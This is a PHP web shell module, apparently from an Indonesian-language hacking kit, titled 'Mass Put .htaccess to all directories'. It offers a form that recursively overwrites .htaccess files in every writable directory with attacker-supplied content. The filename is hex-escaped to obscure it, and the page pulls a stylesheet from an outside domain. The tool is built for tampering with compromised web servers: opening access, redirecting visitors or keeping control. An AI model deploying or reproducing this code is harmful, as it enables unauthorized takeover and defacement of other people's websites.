<link rel="stylesheet" href="//xnxx.co.ws/meki.css">
<title>Mass Put <?="\x2E\x68\x74\x61\x63\x63\x65\x73\x73"?> to all directories</title>
<div class='card card-body text-dark input-group mb-3'>
<form method='POST'> 
    <i class='bi bi-folder'></i> Directory:
    <input class='form-control btn-sm' type='text' name='d_dir' value='<?=getcwd();?>'>
    <i class='bi bi-file-earmark'></i> Isi <?="\x2E\x68\x74\x61\x63\x63\x65\x73\x73"?> nya:
    <textarea class='form-control btn-sm' rows='7' name='script' placeholder='Allow from all'></textarea>
    <div class='d-grid gap-2'>
        <input class='btn btn-dark btn-sm' type='submit' name='start' value='OK !'>
    </div>
</form>
</div>

<?php
if(isset($_POST['start'])){
// Define the text to write to the file
$text = $_POST['script'];

// Define the function to write the file to directories
function writeToWritableDirectories($dir, $file, $text) {
    // Check if the directory and file are writable
    $filepath = "$dir/$file";
    if (is_writable($dir) && !file_exists($filepath) || is_writable($filepath)) {
        // Write the text to the file in the current directory
        $handle = fopen($filepath, "w");
        fwrite($handle, $text);
        fclose($handle);

        // Get a list of all subdirectories
        $dirs = array_filter(glob("$dir/*"), 'is_dir');

        // Recursively write the file to each writable subdirectory
        foreach ($dirs as $subdir) {
            if (is_writable($subdir)) {
                echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$subdir/$file<br>";
                writeToWritableDirectories($subdir, $file, $text);
            } else{
                echo "[<rd>&nbsp;X&nbsp;</rd>]&nbsp;$subdir/$file<br>";
            }
        }
    }
}

// Call the function to write the file to all writable directories and subdirectories
writeToWritableDirectories($_POST['d_dir'], "\x2E\x68\x74\x61\x63\x63\x65\x73\x73", $text);
}
?>
